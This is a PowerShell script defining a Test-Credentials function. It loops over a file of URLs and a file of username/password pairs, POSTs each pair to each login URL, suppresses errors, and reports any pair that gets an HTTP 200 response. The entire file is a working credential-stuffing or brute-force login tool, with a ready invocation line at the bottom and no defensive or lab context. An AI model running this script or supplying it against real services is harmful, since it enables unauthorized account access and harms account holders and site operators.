function Test-Credentials {
    param (
        [Parameter()]
        [string]$CredentialsFile,
        [Parameter(Mandatory)]
        [string]$URLsFile
    )

    $existingURLs = Get-Content -Path $URLsFile
    $credentials = Get-Content -Path $CredentialsFile

    foreach ($url in $existingURLs) {
        Write-Host "Now trying for URL: $url"

        foreach ($credential in $credentials) {
            $creds = $credential -split ','
            $username = $creds[0]
            $password = $creds[1]

            Write-Host "-> Now trying with credentials: $username, $password"

            try {
                $response = Invoke-WebRequest -Uri $url -Method Post -Body @{
                    username = $username
                    password = $password
                } -ContentType 'application/json' -MaximumRedirection 0 -ErrorAction SilentlyContinue
                if ($response.StatusCode -eq 200) {
                    Write-Host "Credentials found! Username: $username, password: $password"
                    return
                }
            }
            catch {
                # Ignore any errors, as we're just trying to find valid credentials
            }
        }
    }
}


# Test-Credentials -CredentialsFile $args[0] -URLsFile $args[1]